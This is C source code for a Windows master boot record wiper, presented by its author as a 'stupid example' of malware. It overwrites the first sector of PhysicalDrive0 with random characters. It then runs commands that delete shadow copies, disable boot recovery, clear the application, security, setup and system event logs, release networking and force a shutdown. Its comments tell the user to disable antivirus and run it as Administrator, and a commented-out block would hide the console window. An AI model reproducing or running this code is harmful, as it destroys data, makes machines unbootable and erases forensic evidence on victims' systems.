//A stupid example of MBR Wiper (Poorly written)

//Resources that helped me with this funny project:
//Microsoft Win32API Documentation
//MBR wipe functions were inspired by: https://github.com/DancinParrot/Unbootable
//COMMANDS were inspired by: https://attack.mitre.org/techniques/T1490/

//Compiled with Code::Blocks on Windows 10 22_2H.
//It will be flagged. Disable Windows Defender or any other AV
//Run as Administrator

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>

#define COMMAND0 "vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no"
#define COMMAND1 "wevtutil cl application"
#define COMMAND2 "wevtutil cl security"
#define COMMAND3 "wevtutil cl setup"
#define COMMAND4 "wevtutil cl system"
#define COMMAND5 "ipconfig /release"
#define COMMAND6 "shutdown /s /t 0"

int main()
{
	/*Uncomment to hide cmd when executing exe file
	HWND hide;
	AllocConsole();
	hide = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hide, 0);
	*/

	printf("----- [+] MBR Wiper [+] -----\n");
	char Characters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	size_t MBRLength[512] = {0};
	printf("[+] Array for overwrite set to 0\n");
	time_t GetTime = time(NULL);
	srand((unsigned int)GetTime);
	printf("[+] Seed Generated. Time_t is : %ld\n", GetTime);
	for (int i = 0; i < 512; i++)
	{
		//Generating a random index within the range of Characters
		int GetRandIndex = rand() % (sizeof(Characters) - 1);
		MBRLength[i] = Characters[GetRandIndex];
	}
	printf("[+] MBR will be wiped with the following characters:\n");
	for (int j = 0; j < 512; j++)
	{
		printf("%c", MBRLength[j]);
	}
	MessageBoxW(NULL, L"MSGBOX", L"MSG", MB_OKCANCEL | MB_ICONINFORMATION);
	printf("\n[+] Creating Handle to MBR\n");
	HANDLE hMBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);

	char Buffer[512];
	printf("[+] Copying Array to Buffer\n");
	memcpy(Buffer, MBRLength, sizeof(MBRLength)); //Copy contents of MBRLength to Buffer
	BOOL Success = WriteFile(hMBR, Buffer, 512, NULL, NULL);
	CloseHandle(hMBR);
	printf("[+] Handle hMBR Closed\n");
	if (Success)
	{
		printf("\n ----- [+] Everything Worked! R.I.P. [+] ----- \n");
		Sleep(5);
		system(COMMAND0);
		system(COMMAND1);
		system(COMMAND2);
		system(COMMAND3);
		system(COMMAND4);
		system(COMMAND5);
		system(COMMAND6);
		return 0;
	}
	return 0;
}
